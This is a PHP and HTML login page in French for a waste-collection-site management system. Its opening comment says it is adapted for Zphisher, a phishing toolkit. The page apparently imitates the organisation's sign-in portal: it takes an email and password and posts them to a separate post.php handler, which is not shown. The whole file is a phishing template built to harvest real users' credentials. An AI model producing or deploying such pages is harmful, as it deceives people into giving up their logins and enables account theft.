<?php
// Adapted login.php for Zphisher
session_start();

$error = $_SESSION['error'] ?? null;
unset($_SESSION['error']);
?>
<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Connexion - Système de gestion</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Outfit', sans-serif;
    }

    body {
      min-height: 100vh;
      background: radial-gradient(circle at center, #25255b 0%, #0a0a3b 55%, #050527 100%);
      display: flex;
      justify-content: center;
      align-items: center;
      color: white;
      padding: 20px;
    }

    .login-card {
      width: 440px;
      max-width: 100%;
      background: rgba(30, 30, 65, 0.9);
      border-radius: 32px;
      padding: 45px 35px 35px;
      box-shadow: 0 0 60px rgba(0, 255, 230, 0.15);
      position: relative;
      overflow: hidden;
      border: 1px solid rgba(255, 255, 255, 0.05);
    }

    /* Decorative Glow backlights */
    .login-card::before {
      content: '';
      position: absolute;
      top: -50%;
      left: -50%;
      width: 200%;
      height: 200%;
      background: radial-gradient(circle at center, rgba(0, 255, 230, 0.05) 0%, transparent 50%);
      pointer-events: none;
    }

    .header {
      text-align: center;
      margin-bottom: 40px;
    }

    .logo-container {
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 15px;
      margin-bottom: 12px;
    }

    .logo-svg {
      width: 50px;
      height: 50px;
      fill: #22fff3;
      filter: drop-shadow(0 0 8px rgba(34, 255, 243, 0.5));
    }

    .title {
      font-size: 38px;
      font-weight: 700;
      color: #39cfff;
      letter-spacing: -0.5px;
      text-shadow: 0 0 15px rgba(57, 207, 255, 0.3);
    }

    .subtitle {
      color: rgba(255, 255, 255, 0.6);
      font-size: 16px;
      font-weight: 400;
      letter-spacing: 0.5px;
    }

    .form-group {
      margin-bottom: 25px;
    }

    label {
      display: block;
      font-size: 12px;
      font-weight: 700;
      letter-spacing: 1.2px;
      color: #17ffe8;
      margin-bottom: 10px;
      text-transform: uppercase;
      opacity: 0.9;
    }

    .input-wrapper {
      position: relative;
    }

    input {
      width: 100%;
      height: 54px;
      background: rgba(45, 45, 85, 0.7);
      border: 1px solid rgba(34, 255, 243, 0.3);
      border-radius: 12px;
      padding: 0 18px;
      color: white;
      font-size: 16px;
      font-weight: 400;
      outline: none;
      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
    }

    input::placeholder {
      color: rgba(255, 255, 255, 0.3);
    }

    input:focus {
      border-color: #22fff3;
      background: rgba(55, 55, 100, 0.8);
      box-shadow: 0 0 20px rgba(34, 255, 243, 0.15);
    }

    .btn {
      width: 100%;
      height: 58px;
      margin-top: 10px;
      border-radius: 16px;
      border: none;
      background: linear-gradient(135deg, #22fff3 0%, #4a90e2 100%);
      color: #050527;
      font-size: 18px;
      font-weight: 700;
      letter-spacing: 1.5px;
      cursor: pointer;
      text-transform: uppercase;
      box-shadow: 
        0 8px 25px rgba(34, 255, 243, 0.2),
        inset 0 2px 2px rgba(255, 255, 255, 0.3);
      transition: all 0.3s ease;
    }

    .btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 12px 30px rgba(34, 255, 243, 0.3);
      filter: brightness(1.1);
    }

    .btn:active {
      transform: translateY(0);
    }

    .links {
      text-align: center;
      margin-top: 25px;
      font-size: 15px;
      font-weight: 500;
      color: #22fff3;
    }

    .links a {
      color: #22fff3;
      text-decoration: none;
      font-weight: 600;
      transition: opacity 0.2s;
    }

    .links a:hover {
      opacity: 0.8;
      text-decoration: underline;
    }

    .alert {
      background: rgba(255, 80, 80, 0.1);
      border: 1px solid rgba(255, 80, 80, 0.4);
      color: #ff9999;
      padding: 12px;
      border-radius: 10px;
      margin-bottom: 20px;
      font-size: 14px;
      text-align: center;
    }

    @media (max-width: 480px) {
      .login-card {
        padding: 35px 25px 25px;
      }
      .title { font-size: 32px; }
      .logo-svg { width: 40px; height: 40px; }
    }
  </style>
</head>
<body>

  <div class="login-card">
    <div class="header">
      <div class="logo-container">
        <svg class="logo-svg" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
          <path d="M12 2C9.243 2 7 4.243 7 7V10H6C4.895 10 4 10.895 4 12V20C4 21.105 4.895 22 6 22H18C19.105 22 20 21.105 20 20V12C20 10.895 19.105 10 18 10H17V7C17 4.243 14.757 2 12 2ZM9 7C9 5.346 10.346 4 12 4C13.654 4 15 5.346 15 7V10H9V7ZM12 18C10.895 18 10 17.105 10 16C10 14.895 10.895 14 12 14C13.105 14 14 14.895 14 16C14 17.105 13.105 18 12 18Z"/>
        </svg>
        <span class="title">Connexion</span>
      </div>
      <p class="subtitle">Système de gestion des déchèteries</p>
    </div>

    <?php if ($error): ?>
      <div class="alert"><?php echo htmlspecialchars($error); ?></div>
    <?php endif; ?>

    <form method="POST" action="post.php">
      <div class="form-group">
        <label for="email">Email</label>
        <div class="input-wrapper">
          <input
            type="email"
            id="email"
            name="email"
            placeholder="votre@email.fr"
            required
            autocomplete="email"
          >
        </div>
      </div>

      <div class="form-group">
        <label for="password">Mot de passe</label>
        <div class="input-wrapper">
          <input
            type="password"
            id="password"
            name="password"
            placeholder="••••••••"
            required
            autocomplete="current-password"
          >
        </div>
      </div>

      <button type="submit" class="btn">Se connecter</button>
    </form>

    <div class="links">
      Pas de compte ? <a href="#">S'inscrire</a>
      <span style="color: rgba(255,255,255,0.2); margin: 0 10px;">|</span>
      <a href="#">← Retour à l'accueil</a>
    </div>
  </div>

</body>
</html>
